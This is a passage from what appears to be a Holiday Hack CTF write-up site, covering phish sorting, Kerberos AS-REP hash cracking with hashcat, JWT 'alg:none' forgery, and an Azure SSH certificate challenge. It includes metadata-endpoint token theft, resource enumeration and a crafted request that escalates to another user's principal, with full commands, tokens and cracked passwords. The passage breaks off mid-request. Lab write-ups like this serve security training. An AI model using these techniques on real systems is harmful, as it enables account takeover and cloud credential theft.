base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')</code></p> <p>Answer</p> <p>Beware the Cube that Wombles</p>"},{"location":"objectives/o13/#response","title":"Response","text":"<p>Tangle Coalbox</p> <p>I had my doubts, but you've proven your worth. That phishing scheme won't trouble our client's organization anymore, thanks to your keen eye and investigatory prowess. So long, Gumshoe, and be careful out there.</p>"},{"location":"objectives/o14/","title":"Phish Detection Agency","text":"<p>Difficulty:  Direct link: Phish Detect</p>"},{"location":"objectives/o14/#objective","title":"Objective","text":"<p>Request</p> <p>Fitzy Shortstack on Film Noir Island needs help battling dastardly phishers. Help sort the good from the bad!</p> Fitzy Shortstack <p>Just my luck, I thought... A cybersecurity incident right in the middle of this stakeout. Seems we have a flood of unusual emails coming in through ChatNPT. Got a nagging suspicion it isn't catching all the fishy ones. You're our phishing specialist right? Could use your expertise in looking through the output of ChatNPT. Not suggesting a full-blown forensic analysis, just mark the ones screaming digital fraud. We're looking at all this raw data, but sometimes, it takes a keen human eye to separate the chaff, doesn't it? I need to get more powdered sugar for my donuts, so do ping me when you have something concrete on this.</p>"},{"location":"objectives/o14/#hints","title":"Hints","text":"DMARC, DKIM, and SPF, oh my! <p>Discover the essentials of email security with DMARC, DKIM, and SPF at Cloudflare's Guide.</p>"},{"location":"objectives/o14/#solution","title":"Solution","text":"<p>We can see from the DNS record, that emails should come from mail.geeseislands.com, pass DKIM and be mailed to dmarc-reports@geeseislands.com if they don't.</p> <p>So for this challenge, we can just go into the inbox and read through the emails one by one. If they fail DKIM or aren't <code>Received: from mail.geeseislands.com</code>, mark them as a phish. If they pass DKIM and are received from mail.geeseislands, mark them as safe.</p> <p>For example, the following has been incorrectly marked as a phish: </p> <p>While this one has been incorrectly marked as safe: </p>"},{"location":"objectives/o14/#response","title":"Response","text":"<p>Fitzy Shortstack</p> <p>You've cracked the case! Once again, you've proven yourself to be an invaluable asset in our fight against these digital foes.</p>"},{"location":"objectives/o15/","title":"Hashcat","text":"<p>Difficulty:  Direct link: Hashcat</p>"},{"location":"objectives/o15/#objective","title":"Objective","text":"<p>Request</p> <p>Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it!</p> Eve Snowshoes <p>Greetings, fellow adventurer! Welcome to Scaredy-Kite Heights, the trailhead of the trek through the mountains on the way to the wonderful Squarewheel Yard! I'm Eve Snowshoes, resident tech hobbyist, and I hear Alabaster is in quite the predicament. Our dear Alabaster forgot his password. He's been racking his jingle bells of memory with no luck. I've been trying to handle this password recovery thing parallel to this hashcat business myself but it seems like I am missing some tricks. So, what do you say, chief, ready to get your hands on some hashcat action and help a distraught elf out?</p>"},{"location":"objectives/o15/#solution","title":"Solution","text":"Background <p>In a realm of bytes and digital cheer,   The festive season brings a challenge near.   Santa's code has twists that may enthrall,   It's up to you to decode them all. Hidden deep in the snow is a kerberos token,   Its type and form, in whispers, spoken.   From reindeers' leaps to the elfish toast,   Might the secret be in an ASREP roast? <code>hashcat</code>, your reindeer, so spry and true,   Will leap through hashes, bringing answers to you.   But heed this advice to temper your pace,   <code>-w 1 -u 1 --kernel-accel 1 --kernel-loops 1</code>, just in case. For within this quest, speed isn't the key,   Patience and thought will set the answers free.   So include these flags, let your command be slow,   And watch as the right solutions begin to show. For hints on the hash, when you feel quite adrift,   This festive link, your spirits, will lift:   https://hashcat.net/wiki/doku.php?id=example_hashes And when in doubt of <code>hashcat</code>'s might,   The CLI docs will guide you right:   https://hashcat.net/wiki/doku.php?id=hashcat Once you've cracked it, with joy and glee so raw,   Run /bin/runtoanswer, without a flaw.   Submit the password for Alabaster Snowball,   Only then can you claim the prize, the best of all. So light up your terminal, with commands so grand,   Crack the code, with <code>hashcat</code> in hand!   Merry Cracking to each, by the pixelated moon's light,   May your hashes be merry, and your codes so right! * Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to /bin/runtoanswer .*</p> <p>First we have to determine what type of hash it is: <pre><code>$ cat hash.txt \n$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966\n</code></pre></p> <p><code>krb</code> makes me think it's probably some form of Kerberos authentication. If we search for <code>kerberos</code> on a hashcat manual, we can see the following options: <pre><code>7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols \n  13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols \n  18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols \n  19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols \n  19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols \n  19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols \n  19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols \n</code></pre></p> <p>It probably isn't a REQ, Pre-Auth or Ticket-Granting Service password since it's Alabaster's password and Eve didn't mention anything special, so it's probably <code>18200</code>. Let's try hashcat with that: <pre><code>$ hashcat -m 18200 ./hash.txt password_list.txt --force\nhashcat (v5.1.0) starting...\n\nOpenCL Platform #1: The pocl project\n...\nDevice #1: Kernel m18200_a0-pure.d7bc3268.kernel not found in cache! Building may take a while...\nKilled\n</code></pre></p> <p>So it failed for something kernel-related. Searching for kernel in the man page linked above, shows -n, -u and -t can all be configured</p> Kernel options <p>-n, --kernel-accel             | Num  | Manual workload tuning, set outerloop step size to X | -n 64  -u, --kernel-loops             | Num  | Manual workload tuning, set innerloop step size to X | -u 256  -T, --kernel-threads           | Num  | Manual workload tuning, set thread count to X        | -T 64 </p> <p>Let's try them at their lowest:</p> <pre><code>$ hashcat -m 18200 ./hash.txt password_list.txt --force -u 1 -n 1 -t 1\n...\n$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: Kerberos 5 AS-REP etype 23\nHash.Target......: $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2...dd1966\nTime.Started.....: Tue Jan  2 04:09:29 2024 (1 sec)\nTime.Estimated...: Tue Jan  2 04:09:30 2024 (0 secs)\nGuess.Base.......: File (password_list.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:     1228 H/s (0.72ms) @ Accel:1 Loops:1 Thr:64 Vec:16\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 144/144 (100.00%)\nRejected.........: 0/144 (0.00%)\nRestore.Point....: 0/144 (0.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-0\nCandidates.#1....: 1LuvCandyC4n3s!2022 -&gt; iLuvC4ndyC4n3s!23!\n</code></pre> <p>Answer</p> <p>IluvC4ndyC4nes!</p>"},{"location":"objectives/o15/#response","title":"Response","text":"<p>Eve Snowshoes</p> <p>Aha! Success! Alabaster will undoubtedly be grateful for our assistance. Onward to our next adventure, comrade! Feel free to explore this whimsical world of gears and steam!</p> <p>Unfortunately it doesn't seem like we can currently use that password: <pre><code>$ su alabaster_snowball\nsu: user alabaster_snowball does not exist\n</code></pre></p>"},{"location":"objectives/o16/","title":"Elf Hunt","text":"<p>Difficulty:  Direct link: Elf Hunt</p>"},{"location":"objectives/o16/#objective","title":"Objective","text":"<p>Request</p> <p>Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.</p> Piney Sappington <p>Hey there, friend! Piney Sappington here. You look like someone who's good with puzzles and games. I could really use your help with this Elf Hunt game I'm stuck on. I think it has something to do with manipulating JWTs, but I'm a bit lost. If you help me out, I might share some juicy secrets I've discovered. Let's just say things around here haven't been exactly... normal. So, what do ya say? Are you in? Oh, brilliant! I just know we'll crack this game together. I can't wait to see what we uncover, and remember, mum's the word! Thanks a bunch! Keep your eyes open and your ears to the ground.</p>"},{"location":"objectives/o16/#hints","title":"Hints","text":"JWT Secrets Revealed <p>Unlock the mysteries of JWTs with insights from PortSwigger's JWT Guide.</p>"},{"location":"objectives/o16/#solution","title":"Solution","text":"<p>Visiting elfhunt.org sets a cookie in our browser <code>ElfHunt_JWT</code> with value <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwMH0.</code> Even ignoring the big JWT hint, it looks an awful look like base64, so let's see what it decodes as:</p> <p></p> <p>The JWT consists of three parts separated by <code>.</code>: - The header <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</code> which decodes to <code>{\"alg\":\"none\",\"typ\":\"JWT\"}</code>, showing that there's no authentication of the JWT - The content <code>eyJzcGVlZCI6LTUwMH0</code>, which decodes to <code>{\"speed\":-500}</code> - The signature, which is empty because there is no authentication.</p> <p>So we can simply change the speed, re-encode it and then update the cookie. From a couple of experiments, setting it to positive seems to make the elves not appear (I assume they go down, off the screen rather than up), and setting it too low makes the game painfully slow. With a trackpad, a speed of about <code>-40</code> seemed about as fast as I could manage and was still pretty slow.</p> <p></p> <p>So I recommend setting the speed a bit \"higher\" (maybe -60) and using a proper mouse.</p> <p>After playing the game, we get our achievement and a hint for later.</p> <p></p>"},{"location":"objectives/o16/#response","title":"Response","text":"<p>Piney Sappington</p> <p>Well done! You've brilliantly won Elf Hunt! I couldn't be more thrilled. Keep up the fine work, my friend! What have you found there? The Captain's Journal? Yeah, he comes around a lot. You can find his comms office over at Brass Buoy Port on Steampunk Island.</p>"},{"location":"objectives/o17/","title":"Certificate SSHenanigans","text":"<p>Difficulty:  Direct link: Generate a certificate at northpole-ssh-certs and ssh onto <code>ssh-server-vm.santaworkshopgeeseislands.org</code></p>"},{"location":"objectives/o17/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement?</p> Alabaster Snowball <p>Hello there! Alabaster Snowball at your service. I could use your help with my fancy new Azure server at ssh-server-vm.santaworkshopgeeseislands.org. ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea! It even generated ready-to-deploy code for an Azure Function App so elves can request their own certificates. What a timesaver! I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy this configuration to all the Geese Islands servers. Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list. If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently. Oh, and if you need to peek at the Function App code, there's a handy Azure REST API endpoint which will give you details about how the Function App is deployed.</p>"},{"location":"objectives/o17/#hints","title":"Hints","text":"Azure Function App Source Code <p>The get-source-control Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.</p> Azure VM Access Token <p>Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the Azure REST API instead.</p> SSH Certificates Talk <p>Check out Thomas Bouve's talk and demo to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.</p>"},{"location":"objectives/o17/#solution","title":"Solution","text":"<p>Before we can SSH onto the machine, we need to generate a certificate. I'm a fan of GitHub's guide, but we don't really need to worry aobut security in this case, so just run: <pre><code>$ ssh-keygen -C &lt;your SHH handle&gt;\n</code></pre> Don't set a passphrase and save the file in your local directory as <code>shh</code>.</p> <p>Normally you'd need to copy the public key onto the server so that it can verify you, but as Thomas Bouve's talk notes, this is time-consuming and tedious and can be replaced by key-signing. So copy the contents of <code>ssh.pub</code> into the Azure Function App.</p> <p>The output should look something like:</p> <p></p> <p>Copy the \"ssh_cert\" value into <code>ssh.pub</code> (without the ending space) and save the file.</p> <p>We can then connect to the <code>monitor</code> account as Alabaster requested: <pre><code>$ ssh -o \"IdentitiesOnly=yes\" -i shh monitor@ssh-server-vm.santaworkshopgeeseislands.org\n</code></pre></p> <p>Several previous Holiday Hack challenges have involved fetching metadata from 169.254.169.254 and we know this is on Azure, so let's see if we can find anything about that. The second hint links to this page on getting an access token:</p> <pre><code>$ curl \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/\" --header \"Metadata:true\"\n{\"access_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDM4OTY1MDIsIm5iZiI6MTcwMzg5NjUwMiwiZXhwIjoxNzAzOTgzMjAyLCJhaW8iOiJFMlZnWU9EMjZpcjVzZTVYYmNlYW5xWmpjLy9mQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiIxM0ZKdWdsVWpreWJBU1RPajhEakJRIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.I8RIr3_mMtkoRr7_7M91osZt_mZI-2ugC-zl2iuixSJhsVQgOcF-YJlZoHdcnCWuu0EmZHLHqjtoQnz1tFuHfg8ecmPOfpiRk4Ah57mU2Y_c92FQyl9se1TZETX1Titt15UsM-xa5iWuMcLQAyQHLs95hEUJS3I98pqPYKyzOfzaw5rXxuzWdD5lioyyHevvEgQgoWTmWbTeNM7Y0UKXJow6gCKnJmhdRECAg3dkrcCj_VcJeYdR1Z8gzjCSTEl6DHX8wJny6s-Gl1GciLm5XxaFrVMBhXzvVA6JPntg_gRuN1-j_tgK5yvdfOtU0XNLu_AlTaR8xTSRZ-R23PqBfg\",\"client_id\":\"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce\",\"expires_in\":\"85187\",\"expires_on\":\"1703983202\",\"ext_expires_in\":\"86399\",\"not_before\":\"1703896502\",\"resource\":\"https://management.azure.com/\",\"token_type\":\"Bearer\"}\n</code></pre> <p>Important</p> <p>I'll just <code>jq</code> to make future output easier to read. The access token will expire, so you will need to run the above command and then <code>export at=\"&lt;THE ACCESS_TOKEN VALUE ABOVE&gt;</code> for the following commands to work.</p> <p>Our first hint refers to the URL <code>https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01</code>, so we now have the authentication token for that and just need:</p> <ul> <li>the subscriptionId</li> <li>the resourceGroupName</li> <li>the site name</li> </ul>"},{"location":"objectives/o17/#finding-the-subscription-id","title":"Finding the Subscription ID","text":"<p>To find the subscription ID, we probably want to list the subscriptions we have access to. Googling \"Azure REST API get subscriptions\" takes us to this page, and we have everything we need to make that request so let's go ahead and do that:</p> <pre><code>$ curl \"https://management.azure.com/subscriptions?api-version=2022-12-01\" --header \"Authorization: Bearer $at\" | jq\n% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   245  100   245    0     0    675      0 --:--:-- --:--:-- --:--:--   674\n{\n  \"value\": [\n    {\n      \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64\",\n      \"authorizationSource\": \"RoleBased\",\n      \"managedByTenants\": [],\n      \"tags\": {\n        \"sans:application_owner\": \"SANS:R&amp;D\",\n        \"finance:business_unit\": \"curriculum\"\n      },\n      \"subscriptionId\": \"2b0942f3-9bca-484b-a508-abdae2db5e64\",\n      \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n      \"displayName\": \"sans-hhc\",\n      \"state\": \"Enabled\",\n      \"subscriptionPolicies\": {\n        \"locationPlacementId\": \"Public_2014-09-01\",\n        \"quotaId\": \"EnterpriseAgreement_2014-09-01\",\n        \"spendingLimit\": \"Off\"\n      }\n    }\n  ],\n  \"count\": {\n    \"type\": \"Total\",\n    \"value\": 1\n  }\n}\n</code></pre> <p>So the subscription ID is: <code>2b0942f3-9bca-484b-a508-abdae2db5e64</code></p>"},{"location":"objectives/o17/#finding-the-resource-group-name","title":"Finding the Resource Group Name","text":"<p>Googling for \"Azure REST API list resource groups\" finds this page which we also now have everything we need to run:</p> <pre><code>$ curl \"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups?api-version=2021-04-01\" --header \"Authorization: Bearer $at\" | jq\n% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   245  100   245    0     0    675      0 --:--:-- --:--:-- --:--:--   674\n{\n  \"value\": [\n    {\n      \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1\",\n      \"name\": \"northpole-rg1\",\n      \"type\": \"Microsoft.Resources/resourceGroups\",\n      \"location\": \"eastus\",\n      \"tags\": {},\n      \"properties\": {\n        \"provisioningState\": \"Succeeded\"\n      }\n    }\n  ]\n}\n</code></pre> <p>So the resource group name is <code>northpole-rg1</code></p>"},{"location":"objectives/o17/#finding-the-site-name","title":"Finding the Site Name","text":"<p>It doesn't seem like there's a REST API for getting the site name, it might just be the hostname: <code>northpole-ssh-certs-fa</code>, so let's try that and revisit if it doesn't work...</p>"},{"location":"objectives/o17/#getting-the-source","title":"Getting the Source","text":"<p>Now we can run the command from the hint <pre><code>$ curl \"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01\" --header \"Authorization: Bearer $at\" | jq\n% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   982  100   982    0     0   1641      0 --:--:-- --:--:-- --:--:--  1644\n{\n  \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web\",\n  \"name\": \"northpole-ssh-certs-fa\",\n  \"type\": \"Microsoft.Web/sites/sourcecontrols\",\n  \"location\": \"East US\",\n  \"tags\": {\n    \"project\": \"northpole-ssh-certs\",\n    \"create-cert-func-url-path\": \"/api/create-cert?code=candy-cane-twirl\"\n  },\n  \"properties\": {\n    \"repoUrl\": \"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa\",\n    \"branch\": \"main\",\n    \"isManualIntegration\": false,\n    \"isGitHubAction\": true,\n    \"deploymentRollbackEnabled\": false,\n    \"isMercurial\": false,\n    \"provisioningState\": \"Succeeded\",\n    \"gitHubActionConfiguration\": {\n      \"codeConfiguration\": null,\n      \"containerConfiguration\": null,\n      \"isLinux\": true,\n      \"generateWorkflowFile\": true,\n      \"workflowSettings\": {\n        \"appType\": \"functionapp\",\n        \"publishType\": \"code\",\n        \"os\": \"linux\",\n        \"variables\": {\n          \"runtimeVersion\": \"3.11\"\n        },\n        \"runtimeStack\": \"python\",\n        \"workflowApiVersion\": \"2020-12-01\",\n        \"useCanaryFusionServer\": false,\n        \"authType\": \"publishprofile\"\n      }\n    }\n  }\n}\n</code></pre></p> <p>So the source is a GitHub repo. I wonder if that's public...</p>"},{"location":"objectives/o17/#accessing-the-source","title":"Accessing the Source","text":"<p>It is public, and it seems pretty interesting to me that the principal is barely validated</p>"},{"location":"objectives/o17/#the-vulnerability","title":"The vulnerability","text":"<p>So when we first requested our certificate to be signed, it gave us a principal of \"elf\".</p> Finding the principal <p>It took me a while to figure out what principal I should use; I tried \"admin\" initially but apparently did something wrong. I then wondered if I should use <code>alabaster</code>, or one of the roles from the KQL challenge (eg \"Santa Claus\", \"Vice President Elf\" or some variation thereof). It's case sensitive though (which you can confirm by requesting a principal of \"Elf\" and seeing that you can't login to the monitor account, so it'd be hard to figure it out alone). Fortunately, you can read <code>/etc/ssh/</code> which has an <code>auth_principals</code> directory: <pre><code>monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster \nadmin\n</code></pre></p> <p>What happens if we make a new signing request with our original public key but with the additional parameter <code>principal=admin</code>?</p> Use Burp Proxy <p>You can use the repeater to send the following request, but replace my pub_key with yours: <pre><code>POST /api/create-cert?code=candy-cane-twirl HTTP/2\nHost: northpole-ssh-certs-fa.azurewebsites.net\nContent-Length: 604\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: https://northpole-ssh-certs-fa.azurewebsites.net\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nPriority: u=1, i\n\n{\"ssh_pub_key\":\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+HRlKJhlxwczAkF0IAYkEV0wTRloVrLViSiDRWtXsWkDi232bDr74wyin81D+/uarcvz435iUhJilEWBmczxmTa3oeXPNpuDZPUl+93NAU2IojshdZGZ4gITQ/Qp9oth4SIplgEFN/Ubeuw7YCBMJgnsDz07CuauM6YzyaFHon7QV7CWNv5gg7ITu3YAzT7IiU5U6ExK9nEnCQuEY4WiNce6ma32wXUskuKVdhnckKJUwUs2Tt02fUaoMC7YgQG464JiYdlEuhMXv9ZjQ5vgfNyBiRrEaUgvp+Nl4g/D8qsx/qYp1oTLBgfYNd63Ag2gybwh7e5ZVsKOhWzbtMMYC7SNtjFH4T8q+byGrIXMJSAUUo422IDfW+zGPEnVrcF6GmfQZM4dM0AZs1ViKz9nx8K3yi3229RPIHkjz+3B9v3Zf6zWRT0OYA+rc0GFdgKnTu1ZFBq2LiPwj8a9R1+bW9q9qphjfe3CCW+vPs/AXk1WP0T046KDLUdqacxLCJwM= zysygy.elf\",\n\"principal\": \"admin\"}\n</code></pre></p> <p>Regenerate a public-private keypair following step 1 if you don't have a copy of your original cert.</p> <p>Like we did in the first step, we can simply copy the newly signed certificate into our public key and connect to alabaster's account:</p> <pre><code>$ ssh -o \"IdentitiesOnly=yes\" -i shh alabaster@ssh-server-vm.santaworkshopgeeseislands.org\nalabaster@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster_todo.md \n# Geese Islands IT &amp; Security Todo List\n\n- [X] Sleigh GPS Upgrade: Integrate the new \"Island Hopper\" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.\n- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.\n- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!\n- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.\n- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!\n- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.\n- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.\n</code></pre> <p>Answer</p> <p>Gingerbread</p>"},{"location":"objectives/o17/#response","title":"Response","text":"<p>Alabaster Snowball</p> <p>Oh my! I was so focused on the SSH configuration I completely missed the vulnerability in the Azure Function App. Why would ChatNPT generate code with such a glaring vulnerability? It's almost like it wanted my system to be unsafe. Could ChatNPT be evil? Thanks for the help, I'll go and update the application code immediately! While we're on the topic of certificates, did you know Active Directory (AD) uses them as well? Apparently the service used to manage them can have misconfigurations too. You might be wondering about that SatTrackr tool I've installed on the monitor account? Here's the thing, on my nightly stargazing adventures I started noticing the same satellite above Geese Islands. I wrote that satellite tracker tool to collect some additional data and sure enough, it's in a geostationary orbit above us. No idea what that means yet, but I'm keeping a close eye on that thing!</p>"},{"location":"objectives/o18/","title":"The Captain's Comms","text":"<p>Difficulty:  Direct link: Captains Comms</p>"},{"location":"objectives/o18/#objective","title":"Objective","text":"<p>Request</p> <p>Speak with Chimney Scissorsticks on Steampunk Island about the interesting things the captain is hearing on his new Software Defined Radio. You'll need to assume the GeeseIslandsSuperChiefCommunicationsOfficer role.</p> Chimney Scissorsticks <p>Ahoy there, I'm Chimney Scissorsticks!You may have noticed some mischief-makers planning to stir up trouble ashore.They've made many radio broadcasts which the captain has been monitoring with his new software defined radio (SDR).The new SDR uses some fancy JWT technology to control access.The captain has a knack for shortening words, some sorta abbreviation trick.Not familiar with JWT values? No worries; just think of it as a clue-solving game.I've seen that the Captain likes to carry his journal with him wherever he goes.If only I could find the planned \"go-date\", \"go-time\", and radio frequency they plan to use.Remember, the captain's abbreviations are your guiding light through this mystery!Once we find a JWT value, these villains won't stand a chance.The closer we are, the sooner we'll be thwarting their pesky plans!We need to recreate an administrative JWT value to successfully transmit a message.Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!</p>"},{"location":"objectives/o18/#hints","title":"Hints","text":"Comms Abbreviations <p>I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.</p> Comms Web Interception Proxies <p>Web Interception proxies like Burp and Zap make web sites fun!</p> Comms Private Key <p>Find a private key, update an existing JWT!</p> Comms JWT Intro <p>A great introduction to JSON Web Tokens is available from Auth0.</p> Comms Journal <p>I've seen the Captain with his Journal visiting Pixel Island! </p>"},{"location":"objectives/o18/#solution","title":"Solution","text":"<p>When we start this challenge, we're presented with the Captain's desk and SDR. I found it a little overwhelming how much there was, so I've highlighted the things that you can and should click on.</p> <p></p> <p>Notably: the Captain's diary entries are at the bottom of the desk (1, 2, 3), the manual are at the top left (7, 8, 9). The speaker is top middle (5), the radio decoder is below it (4) and the controller for sending signals is on the right (6).</p> <p>To complete this challenge, we need to use:</p> <ul> <li>the speaker, which we can do immediately, to get the scoundrels' message</li> <li>the radio decoder, which requires \"radioMonitor\" access, to understand the scoundrels' message</li> <li>the controller, which requires \"administrator\" access, to send the decoy message.</li> </ul> <p>Being able to use the speaker doesn't really help us without the decoder, so we should start by reading all the files that we do have access to. Two specific things seem notable:</p> <p> The JWT giving us access to the radio monitor should be at /jwtDefault/rMonitor.tok</p> <p> The Captain's public key should be at /jwtDefault/keys/capsPubKey.key, assuming \"roleMonitor\" is just the Captain mistyping \"radioMonitor\"?</p> <p>Going to the first location gives us an error: <code>Invalid authorization token provided.</code> I wonder if that's why \"BEARER\" was capitalized in the Owner's manual</p> <p></p> <p>Indeed, sending our JWT as an Authorization header gives us access to the rMonitor and public key</p> Example GET request and values <pre><code>GET 